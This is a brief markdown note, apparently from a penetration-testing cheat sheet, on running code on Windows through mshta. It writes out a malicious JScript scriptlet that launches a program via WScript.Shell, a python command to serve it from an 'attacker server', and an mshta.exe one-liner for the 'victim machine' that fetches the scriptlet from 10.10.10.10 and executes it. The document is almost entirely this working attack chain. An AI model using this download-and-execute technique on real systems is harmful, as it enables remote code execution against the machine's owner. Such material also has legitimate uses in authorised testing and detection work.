# Attacker server
- Create malicious file (m.sct):
```xml
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
        function Exec() {
                var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
        }
]]>
</script>
</scriptlet>
```
- Run listenning server:
```python
python3 -m http.server 80
```

# Victim machine
- Open cmd.exe and run the following command
```cmd
mshta.exe javascript:a=(GetObject("script:http://10.10.10.10/m.sct")).Exec();close();
```
